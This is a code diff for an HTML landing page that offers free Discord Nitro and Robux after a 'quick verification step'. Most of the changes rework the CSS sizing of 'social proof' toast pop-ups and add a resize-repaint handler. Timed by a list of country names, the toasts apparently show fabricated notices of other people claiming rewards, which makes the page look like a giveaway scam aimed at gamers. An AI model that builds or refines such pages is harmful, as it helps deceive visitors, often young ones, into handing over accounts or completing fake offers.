@@ -7,7 +7,6 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* All existing styles – only the toast section is replaced with responsive sizes */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -189,55 +188,55 @@
     .faq-item.open .faq-answer { margin-top: 0.6rem; max-height: 200px; opacity: 1; }
     footer { text-align: center; font-size: 0.7rem; color: #7a7f9e; margin-top: 1.2rem; font-weight: 500; }
 
-    /* ----- RESPONSIVE TOASTS: scales with screen size and zoom ----- */
+    /* ----- FULLY RESPONSIVE TOASTS (scales with zoom & screen size) ----- */
     .activity-toasts {
       position: fixed;
-      bottom: clamp(12px, 3vw, 28px);
-      left: clamp(12px, 3vw, 28px);
+      bottom: max(12px, 2vh);
+      left: max(12px, 2vw);
       z-index: 1000;
       display: flex;
       flex-direction: column;
-      gap: clamp(8px, 2vw, 16px);
+      gap: max(8px, 1.5vh);
       pointer-events: none;
     }
     .activity-toast {
       background: #1a1c2a;
       backdrop-filter: blur(14px);
-      border-radius: clamp(0.75rem, 3vw, 1.25rem);
-      padding: clamp(0.7rem, 2.5vw, 1.2rem) clamp(0.9rem, 3vw, 1.4rem);
-      width: clamp(240px, 70vw, 400px);
-      max-width: 400px;
+      border-radius: max(0.75rem, 2vw);
+      padding: max(0.6rem, 1.8vh) max(0.8rem, 2.5vw);
+      width: min(400px, 80vw);
+      max-width: 420px;
       display: flex;
       align-items: center;
-      gap: clamp(0.7rem, 2vw, 1.2rem);
+      gap: max(0.7rem, 2vw);
       animation: slideInLeft 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
       box-shadow: 0 12px 28px rgba(0, 0, 0, 0.5);
-      border-left: clamp(3px, 0.8vw, 5px) solid;
+      border-left: max(3px, 0.5vw) solid;
     }
     .toast-nitro { border-left-color: #5865f2; }
     .toast-robux { border-left-color: #f5b042; }
     .toast-icon {
-      width: clamp(40px, 8vw, 56px);
-      height: clamp(40px, 8vw, 56px);
+      width: max(40px, 6vw);
+      height: max(40px, 6vw);
       background: #0f1119;
-      border-radius: clamp(0.7rem, 2vw, 1rem);
+      border-radius: max(0.7rem, 1.5vw);
       display: flex;
       align-items: center;
       justify-content: center;
       flex-shrink: 0;
     }
     .toast-icon img {
-      width: clamp(28px, 6vw, 40px);
-      height: clamp(28px, 6vw, 40px);
+      width: max(28px, 4vw);
+      height: max(28px, 4vw);
       object-fit: contain;
     }
     .toast-content {
       flex: 1;
     }
     .toast-header {
-      font-size: clamp(0.7rem, 2vw, 0.85rem);
+      font-size: max(0.7rem, 1.8vw);
       color: #c0c5e0;
-      margin-bottom: clamp(2px, 1vw, 6px);
+      margin-bottom: max(2px, 0.5vh);
     }
     .toast-header strong {
       color: #fff;
@@ -245,13 +244,13 @@
     }
     .toast-reward {
       font-weight: 700;
-      font-size: clamp(0.85rem, 2.5vw, 1.1rem);
+      font-size: max(0.85rem, 2.2vw);
       color: #fff;
-      margin-bottom: clamp(2px, 1vw, 6px);
+      margin-bottom: max(2px, 0.5vh);
       line-height: 1.3;
     }
     .toast-time {
-      font-size: clamp(0.6rem, 1.8vw, 0.75rem);
+      font-size: max(0.6rem, 1.5vw);
       color: #8a8fb0;
     }
     @keyframes slideInLeft {
@@ -456,7 +455,7 @@
       });
     });
 
-    // Social proof toasts (responsive sizes are handled by CSS)
+    // Social proof toasts (responsive)
     const countryNames = [
       "United States", "United Kingdom", "Canada", "Australia", "France", "Germany", "Italy", "Spain",
       "Japan", "South Korea", "India", "Brazil", "Mexico", "Netherlands", "Sweden", "Norway", "Switzerland",
@@ -512,6 +511,15 @@
     setTimeout(showActivityToast, 2000);
     setInterval(showActivityToast, 25000);
     buildRewardList();
+
+    // Force repaint on window resize to ensure zoom responsiveness
+    window.addEventListener('resize', () => {
+      const toasts = document.querySelectorAll('.activity-toast');
+      toasts.forEach(toast => {
+        toast.style.transform = 'scale(0.99)';
+        setTimeout(() => { toast.style.transform = ''; }, 50);
+      });
+    });
   })();
 </script>
 </body>
